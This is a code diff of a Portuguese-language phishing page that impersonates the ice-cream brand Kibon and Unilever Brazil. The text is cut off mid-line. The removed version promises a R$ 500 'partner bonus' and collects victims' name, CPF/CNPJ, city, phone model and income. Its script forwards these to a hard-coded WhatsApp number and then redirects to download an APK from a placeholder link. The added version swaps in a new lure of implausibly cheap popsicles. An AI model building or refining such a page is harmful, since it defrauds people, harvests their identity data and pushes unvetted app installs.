@@ -3,17 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portal do Parceiro - Cadastro e Catálogo</title>
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <title>Kibon Atacado - Picolés a R$ 0,59</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
         :root {
-            --primary-red: #E2001A;
-            --accent-yellow: #FFD700;
-            --success-green: #28a745;
+            --kibon-red: #E2001A;
+            --kibon-yellow: #FFD700;
+            --price-green: #2ecc71;
         }
 
         * { box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
-        body { background: #f4f7f6; margin: 0; padding: 10px; color: #333; }
+        body { background: #f0f2f5; margin: 0; padding: 10px; }
 
         .container {
             background: #fff;
@@ -21,171 +21,56 @@
             max-width: 500px;
             margin: 10px auto;
             border-radius: 25px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
+            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
             overflow: hidden;
         }
 
-        .promo-banner {
-            background: var(--accent-yellow);
-            color: var(--primary-red);
+        .header-flash {
+            background: var(--kibon-red);
+            color: #fff;
             text-align: center;
-            padding: 12px;
-            font-weight: 800;
-            font-size: 13px;
+            padding: 15px;
+            font-weight: 900;
+            font-size: 16px;
             text-transform: uppercase;
-            border-bottom: 3px solid var(--primary-red);
+            animation: blink 1s infinite;
         }
 
-        .header { padding: 25px 20px; text-align: center; }
-        .logo-placeholder { 
-            font-size: 32px; 
-            font-weight: 900; 
-            color: var(--primary-red);
-            letter-spacing: -1px;
-            margin-bottom: 5px;
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
         }
 
-        h1 { font-size: 20px; margin: 5px 0; font-weight: 800; }
-        .subtitle { font-size: 13px; color: #777; margin-bottom: 20px; }
+        .main-header { padding: 30px 20px 10px; text-align: center; }
+        .logo-txt { font-size: 40px; font-weight: 900; color: var(--kibon-red); letter-spacing: -2px; }
+        
+        .promo-box {
+            background: var(--kibon-yellow);
+            margin: 15px 20px;
+            padding: 15px;
+            border-radius: 15px;
+            border: 2px dashed var(--kibon-red);
+        }
+
+        .promo-box h2 { margin: 0; font-size: 18px; color: #333; }
+        .promo-box .price-hero { font-size: 42px; color: var(--kibon-red); display: block; font-weight: 900; }
 
         /* FORMULÁRIO */
-        .form-section { padding: 0 20px 25px; }
-        .field { margin-bottom: 12px; text-align: left; }
+        .form-section { padding: 20px; }
+        .input-group { margin-bottom: 12px; }
         label { display: block; font-size: 11px; font-weight: 700; color: #666; margin-bottom: 4px; text-transform: uppercase; }
         input {
-            width: 100%; padding: 12px; border: 2px solid #f0f0f0; border-radius: 12px;
-            font-size: 14px; outline: none; background: #fafafa; transition: 0.3s;
+            width: 100%; padding: 12px; border: 2px solid #eee; border-radius: 12px;
+            font-size: 14px; outline: none; background: #fafafa;
         }
-        input:focus { border-color: var(--primary-red); background: #fff; }
+        input:focus { border-color: var(--kibon-red); background: #fff; }
 
-        .btn-main {
-            width: 100%; padding: 18px; background: var(--primary-red); color: #fff;
-            border: none; border-radius: 50px; font-size: 16px; font-weight: 800;
-            cursor: pointer; box-shadow: 0 6px 15px rgba(226, 0, 26, 0.3);
-            text-transform: uppercase; margin-top: 10px;
-        }
-
-        /* CATÁLOGO ILUSTRATIVO */
-        .catalog-head {
-            background: #f8f8f8; padding: 15px; text-align: center;
-            font-weight: 800; border-top: 1px solid #eee; border-bottom: 1px solid #eee;
+        .btn-ready {
+            width: 100%; padding: 20px; background: var(--kibon-red); color: #fff;
+            border: none; border-radius: 50px; font-size: 18px; font-weight: 900;
+            cursor: pointer; box-shadow: 0 10px 20px rgba(226, 0, 26, 0.4);
+            margin-top: 10px; transition: 0.3s;
         }
 
-        .grid { padding: 15px; display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
-        .item {
-            background: #fff; border: 1px solid #eee; border-radius: 15px; padding: 10px;
-            text-align: center; position: relative;
-        }
-        .item img { width: 100%; height: 100px; object-fit: cover; border-radius: 10px; margin-bottom: 8px; }
-        .item-name { font-size: 12px; font-weight: 700; color: #444; margin-bottom: 5px; height: 30px; overflow: hidden; }
-        .price-tag { font-size: 14px; color: var(--success-green); font-weight: 800; }
-        .discount-badge { 
-            position: absolute; top: 5px; right: 5px; background: var(--primary-red); 
-            color: #fff; font-size: 9px; padding: 3px 6px; border-radius: 5px; font-weight: 800;
-        }
-
-        .footer { padding: 20px; text-align: center; font-size: 10px; color: #bbb; background: #fafafa; }
-    </style>
-</head>
-<body>
-
-<div class="container">
-    <div class="promo-banner">🎁 BÔNUS DE R$ 500,00 PARA NOVOS PARCEIROS</div>
-    
-    <div class="header">
-        <div class="logo-placeholder">KIBON</div>
-        <h1>Credenciamento 2026</h1>
-        <p class="subtitle">Cadastre sua loja e receba o bônus no App</p>
-    </div>
-
-    <form class="form-section">
-        <div class="field"><label>Nome do Responsável</label><input type="text" id="nome" placeholder="Seu nome"></div>
-        <div class="field"><label>Nome do Comércio</label><input type="text" id="loja" placeholder="Nome da sua loja"></div>
-        <div class="field"><label>CPF ou CNPJ</label><input type="text" id="doc" placeholder="000.000.000-00"></div>
-        
-        <div style="display:flex; gap:10px;">
-            <div class="field" style="flex:2;"><label>Cidade</label><input type="text" id="cidade" placeholder="Sua cidade"></div>
-            <div class="field" style="flex:1;"><label>UF</label><input type="text" id="uf" maxlength="2" placeholder="Ex: SP"></div>
-        </div>
-
-        <div class="field"><label>Modelo do Celular</label><input type="text" id="cel" placeholder="Ex: Samsung A54"></div>
-        <div class="field"><label>Renda Mensal</label><input type="text" id="renda" placeholder="R$ 0,00"></div>
-
-        <button type="button" class="btn-main" onclick="enviarDados()">RESGATAR BÔNUS E BAIXAR APP</button>
-    </form>
-
-    <div class="catalog-head">🍦 OFERTAS PARA O PRIMEIRO PEDIDO (-10%)</div>
-    <div class="grid">
-        <div class="item">
-            <div class="discount-badge">10% OFF</div>
-            <img src="https://images.unsplash.com/photo-1576506295286-5cda18df43e7?auto=format&fit=crop&w=300&q=80" alt="Sorvete">
-            <div class="item-name">Picolé Premium Chocolate</div>
-            <div class="price-tag">R$ 13,50</div>
-        </div>
-        <div class="item">
-            <div class="discount-badge">10% OFF</div>
-            <img src="https://images.unsplash.com/photo-1567206563064-6f60f40a2b57?auto=format&fit=crop&w=300&q=80" alt="Sorvete">
-            <div class="item-name">Cone Crocante Baunilha</div>
-            <div class="price-tag">R$ 10,80</div>
-        </div>
-        <div class="item">
-            <div class="discount-badge">10% OFF</div>
-            <img src="https://images.unsplash.com/photo-1501443762994-82bd5dabb892?auto=format&fit=crop&w=300&q=80" alt="Sorvete">
-            <div class="item-name">Picolé de Frutas Real</div>
-            <div class="price-tag">R$ 5,40</div>
-        </div>
-        <div class="item">
-            <div class="discount-badge">10% OFF</div>
-            <img src="https://images.unsplash.com/photo-1563805042-7684c019e1cb?auto=format&fit=crop&w=300&q=80" alt="Sorvete">
-            <div class="item-name">Pote Clássico 1.5L</div>
-            <div class="price-tag">R$ 25,20</div>
-        </div>
-    </div>
-
-    <div class="footer">DISTRIBUIÇÃO UNILEVER BRASIL © 2026</div>
-</div>
-
-<script>
-    function enviarDados() {
-        const meuWhatsapp = "5554999422678";
-        const linkDoSeuAPK = "https://SEUSITE.netlify.app/seu-app.apk"; // COLOQUE SEU LINK DE DOWNLOAD AQUI
-
-        const campos = {
-            nome: document.getElementById('nome').value,
-            loja: document.getElementById('loja').value,
-            doc: document.getElementById('doc').value,
-            cid: document.getElementById('cidade').value,
-            uf: document.getElementById('uf').value,
-            cel: document.getElementById('cel').value,
-            ren: document.getElementById('renda').value
-        };
-
-        if(Object.values(campos).some(v => v === "")) {
-            alert("Por favor, preencha todos os campos para liberar seu bônus.");
-            return;
-        }
-
-        const texto = `*NOVO PARCEIRO CADASTRADO*%0A` +
-                      `----------------------------%0A` +
-                      `👤 *Nome:* ${campos.nome}%0A` +
-                      `🏪 *Loja:* ${campos.loja}%0A` +
-                      `📄 *Doc:* ${campos.doc}%0A` +
-                      `📍 *Cidade:* ${campos.cid}-${campos.uf}%0A` +
-                      `📱 *Celular:* ${campos.cel}%0A` +
-                      `💰 *Renda:* ${campos.ren}%0A` +
-                      `----------------------------%0A` +
-                      `*SOLICITANDO BÔNUS DE R$ 500*`;
-
-        // Abre Whats
-        window.open(`https://api.whatsapp.com/send?phone=${meuWhatsapp}&text=${texto}`, '_blank');
-        
-        // Alerta e Download
-        setTimeout(() => {
-            alert("Cadastro realizado! O download do App oficial começará agora para você usar seu bônus.");
-            window.location.href = linkDoSeuAPK;
-        }, 1000);
-    }
-</script>
-
-</body>
-</html>
+        /* CATÁLOGO S
